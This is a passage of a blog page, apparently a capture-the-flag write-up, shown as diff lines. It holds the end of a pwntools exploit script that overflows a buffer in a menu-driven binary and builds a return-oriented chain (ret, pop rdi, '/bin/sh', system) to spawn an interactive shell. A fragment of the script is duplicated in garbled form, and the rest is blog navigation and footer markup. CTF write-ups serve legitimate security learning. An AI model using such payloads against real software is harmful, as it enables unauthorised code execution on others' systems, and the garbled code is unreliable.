+<span class="token comment"># time = libc_func.time(0)</span>
+
+<span class="token comment"># libc_func.srand((time) ^ (qword_4040D0))</span>
+<span class="token comment"># new_secret = libc_func.rand() + (libc_func.rand() &lt;&lt; 32)</span>
+<span class="token comment"># print(new_secret)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your choice\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Show me the code:\n"</span><span class="token punctuation">)</span>
+bin_sh <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">'got binsh -> %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your choice\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your choice\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>hoice\n"<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2022/07/28/get-started-3dsctf-2016/"
+      title="get_started_3dsctf_2016"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        get_started_3dsctf_2016
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2022/07/26/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-eyfor/"
+      title="DASCTF2022七月赋能赛 eyfor"
+     >
+
+    <p class="title-text">
+      
+        DASCTF2022七月赋能赛 eyfor
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Your Name<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
